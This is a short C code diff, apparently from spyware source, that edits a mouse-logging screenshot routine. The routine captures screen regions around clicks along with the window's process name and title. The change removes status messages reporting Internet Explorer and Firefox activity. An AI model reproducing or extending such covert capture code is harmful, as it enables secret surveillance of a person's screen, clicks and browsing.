@@ -355,7 +355,6 @@ void TakeSnapShot(HWND grabwind, BOOL only_window, DWORD quality)
 // Questa funzione e' usata dall'agente MouseLog
 void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD g_xscdim, DWORD g_yscdim)
 {
-	static BOOL first_ie = FALSE, first_ff = FALSE;
 	HDC hdccap = 0, g_hScrDC = 0;
 	HBITMAP hbmcap = 0;
 	DWORD g_xmirr, g_ymirr, x_start;
@@ -442,15 +441,6 @@ void TakeMiniSnapShot(DWORD agent_tag, HWND grabwind, int xPos, int yPos, DWORD 
 		FNC(GetWindowThreadProcessId)(grabwind, &dwProcessId);
 		if (!dwProcessId || !(proc_name = HM_FindProcW(dwProcessId))) 
 			proc_name = wcsdup(L"UNKNOWN");
-
-		if (!wcsicmp(proc_name, L"iexplore.exe") && first_ie == FALSE) {
-			REPORT_STATUS_LOG("- Browser activity (IE).........OK\r\n");
-			first_ie = TRUE;
-		}
-		if (!wcsicmp(proc_name, L"firefox.exe") && first_ff == FALSE) {
-			REPORT_STATUS_LOG("- Browser activity (FF).........OK\r\n");
-			first_ff = TRUE;
-		}
 
 		additional_len = sizeof(MouseAdditionalData) + wcslen(proc_name)*sizeof(WCHAR) + wcslen(svTitle)*sizeof(WCHAR);
 		log_header = (BYTE *)malloc(additional_len);
